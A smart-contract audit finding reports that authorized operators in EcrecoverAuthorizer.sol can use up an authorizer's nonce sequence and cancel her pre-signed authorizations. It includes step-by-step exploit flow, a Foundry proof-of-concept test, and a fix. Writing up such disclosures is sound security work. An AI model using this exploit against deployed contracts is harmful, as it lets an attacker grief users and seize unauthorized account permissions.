### Title
Authorized Operator Can Exhaust Authorizer's Nonce Sequence to Invalidate Pre-Signed Authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts signatures from any address that `IMidnight.isAuthorized(authorizer, signer)` returns true for, not just the authorizer themselves. Because the nonce incremented is always `nonce[authorization.authorizer]`, an authorized operator (Bob) can sign and submit valid `Authorization` structs on Alice's behalf with sequential nonces, permanently consuming Alice's nonce sequence and invalidating all of Alice's pre-signed authorization messages.

### Finding Description
The vulnerable path is in `src/periphery/EcrecoverAuthorizer.sol`:

```solidity
// Line 26: nonce[Alice] is incremented on every successful call
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

// Lines 33-36: signer can be Alice OR anyone Alice has authorized on Midnight
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

The `Authorization` struct binds `authorizer`, `authorized`, `isAuthorized`, `nonce`, and `deadline` together. [2](#0-1) 

**Exploit flow:**

1. Alice calls `midnight.setIsAuthorized(Bob, true, Alice)` — Bob is now an authorized operator for Alice.
2. Alice distributes pre-signed `Authorization` messages off-chain with nonces N, N+1, N+2 (e.g., to gaslessly grant/revoke access to counterparties).
3. Bob constructs `Authorization{authorizer=Alice, authorized=<any>, isAuthorized=<any>, nonce=N, deadline=<future>}` and signs it with Bob's own private key.
4. Bob calls `ecrecoverAuthorizer.setIsAuthorized(auth, bobSig)`. The nonce check passes (N == current nonce), the nonce is incremented to N+1, and the signature check passes because `IMidnight(MIDNIGHT).isAuthorized(Alice, Bob)` is true.
5. Bob repeats for nonces N+1, N+2, ... advancing `nonce[Alice]` past all of Alice's pre-signed messages.
6. Any attempt to submit Alice's original pre-signed messages now reverts with `InvalidNonce()`.

The nonce increment at line 26 is a post-increment inside a `require`, so it only persists if the entire transaction succeeds. Bob must produce a valid signature for each submission — which he can, using his own key, since the authorization check accepts any Midnight-authorized signer.

The Certora spec (`certora/specs/EcrecoverAuthorizer.spec`) only verifies that the authorizer's nonce increments and other nonces are unchanged; it does not constrain who the signer may be or prevent an authorized operator from consuming the authorizer's nonces. [3](#0-2) 

### Impact Explanation
Alice's entire pre-signed authorization infrastructure is destroyed. Any off-chain signed `Authorization` messages Alice has distributed (e.g., to gaslessly grant access to her positions) become permanently unsubmittable. Additionally, Bob can use the same mechanism to grant himself or any address authorization over Alice's account via `EcrecoverAuthorizer`, since each submitted `Authorization` struct also calls `IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer)`. [4](#0-3) 

### Likelihood Explanation
Precondition: Bob must be authorized by Alice on Midnight. This is a normal operational state — users routinely authorize operators (e.g., position managers, routers, keepers). Once authorized, the attack is trivially repeatable with zero cost beyond gas, requires no special timing, and is irreversible (nonces cannot be decremented). Alice has no on-chain mechanism to cancel or skip to a safe nonce.

### Recommendation
Restrict the signer of an `Authorization` struct to be exactly `authorization.authorizer`. Authorized operators should not be permitted to sign on the authorizer's behalf within `EcrecoverAuthorizer`, since doing so gives them unilateral control over the authorizer's nonce sequence. If delegated signing is desired, introduce a separate per-operator nonce or require the authorizer to explicitly countersign any delegation of signing rights.

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

### Proof of Concept

```solidity
function testNonceExhaustionByAuthorizedOperator() public {
    // Setup: Alice authorizes EcrecoverAuthorizer and Bob on Midnight
    vm.prank(alice);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, alice);
    vm.prank(alice);
    midnight.setIsAuthorized(bob, true, alice);

    // Alice pre-signs authorization messages at nonces 0, 1, 2
    Authorization memory aliceAuth0 = Authorization({
        authorizer: alice, authorized: charlie, isAuthorized: true,
        nonce: 0, deadline: block.timestamp + 1 days
    });
    Signature memory aliceSig0 = signAuthorization(aliceAuth0, aliceKey);

    // Bob exhausts nonces 0, 1, 2 by signing his own Authorization structs
    for (uint256 i = 0; i < 3; i++) {
        Authorization memory bobAuth = Authorization({
            authorizer: alice, authorized: bob, isAuthorized: true,
            nonce: i, deadline: block.timestamp + 1 days
        });
        Signature memory bobSig = signAuthorization(bobAuth, bobKey);
        ecrecoverAuthorizer.setIsAuthorized(bobAuth, bobSig);
    }

    // Assert: Alice's nonce is now 3
    assertEq(ecrecoverAuthorizer.nonce(alice), 3);

    // Assert: Alice's pre-signed message at nonce 0 is now invalid
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(aliceAuth0, aliceSig0);
}
```

Expected: the final `setIsAuthorized` call reverts with `InvalidNonce()`, confirming Alice's pre-signed messages are permanently invalidated by Bob's nonce exhaustion.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L26-36)
```text
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-48)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/periphery/interfaces/IEcrecoverAuthorizer.sol (L11-17)
```text
struct Authorization {
    address authorizer;
    address authorized;
    bool isAuthorized;
    uint256 nonce;
    uint256 deadline;
}
```

**File:** certora/specs/EcrecoverAuthorizer.spec (L11-21)
```text
/// EcrecoverAuthorizer increments nonce on success and does not change other nonces.
rule effects(env e, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, address other) {
    require other != authorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);
    uint256 otherNonceBefore = nonce(other);

    setIsAuthorized(e, authorization, signature);

    assert nonce(authorization.authorizer) == nonceBefore + 1;
    assert nonce(other) == otherNonceBefore;
}
```
